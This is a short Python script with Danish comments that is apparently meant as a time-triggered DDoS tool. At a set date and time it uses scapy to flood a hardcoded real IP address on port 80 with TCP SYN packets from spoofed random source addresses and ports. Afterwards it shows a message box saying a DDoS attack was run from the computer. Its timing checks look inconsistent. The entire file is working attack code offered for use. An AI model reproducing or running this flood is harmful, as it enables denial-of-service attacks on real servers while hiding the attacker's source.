# Filen vil angribe i 5 minutter og bagefter smide en tekstboks om som fortæller at et DDOS angreb er blevet udført
#
#
#
#
#
import time
import pymsgbox
from scapy.all import *
j=False
option1='OK'
while j==False:
    localtime = time.asctime(time.localtime(time.time()))

    if localtime[9] == "7" and localtime[11] + localtime[12] == "20" and localtime[14] + localtime[15] == "17":  # runs the script forever localtime8 and 9 is the date, while 11 12 is the hour of the day adn 14 15 is the minutes
        j = True

        while localtime[14] + localtime[15] == "00" or localtime[14] + localtime[15] == "01" or localtime[14] + \
                localtime[15] == "02" or localtime[14] + localtime[15] == "03" or localtime[14] + localtime[
            15] == "04" or localtime[14] + localtime[15] == "05":

            target_ip = "79.171.148.161"
            target_port = 80
            ip = IP(src=RandIP(), dst=target_ip)  # sends from a random IP to the target ip of the server
            tcp = TCP(sport=RandShort(), dport=target_port,
                      flags="S")  # sends from random port, to the target port of 80, with the SYN flag on
           # raw = Raw(b"X" * 1400)  # throws in 1400 Bytes of "empty" data
            p = ip / tcp   # builds the package
            send(p)  # sends the package forever (a new is created every time with new src port and IP)
            localtime = time.asctime(time.localtime(time.time()))

if j:
    pymsgbox.confirm('Et DDOS angreb er lige blevet udført fra denne computer.', 'Warning', [option1])
